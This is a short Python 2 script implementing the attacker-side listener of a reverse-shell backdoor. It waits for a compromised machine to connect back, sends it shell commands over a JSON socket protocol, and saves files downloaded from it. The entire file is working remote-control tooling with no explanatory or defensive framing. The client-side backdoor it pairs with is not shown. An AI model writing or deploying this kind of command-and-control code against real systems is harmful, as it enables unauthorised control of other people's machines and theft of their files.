#!/usr/bin/env python

import socket, json, base64


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable socket reuse
        listener.bind((ip, port))

        listener.listen(0)
        print("listening on [any] 8080...")

        self.connection, self.address = listener.accept()
        print("[+] Connection established with " + str(self.address[0]) + " on port " + str(self.address[1]))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful!"

    def execute_remotely(self, command):
        if command[0] == "exit":
            self.reliable_send(command)
            self.connection.close()
            exit()

        self.reliable_send(command)
        return self.reliable_receive()

    def run(self):
        while True:
            try:
                command = raw_input(">> ")
                command = command.split(" ")
                response = self.execute_remotely(command)
                if command[0] == "download":
                    response = self.write_file(command[1], response)
                print(response)
            except KeyboardInterrupt:
                print("\nTerminating connection...")
                exit()


if __name__ == "__main__":
    my_listener = Listener("localhost", 8080)
    my_listener.run()
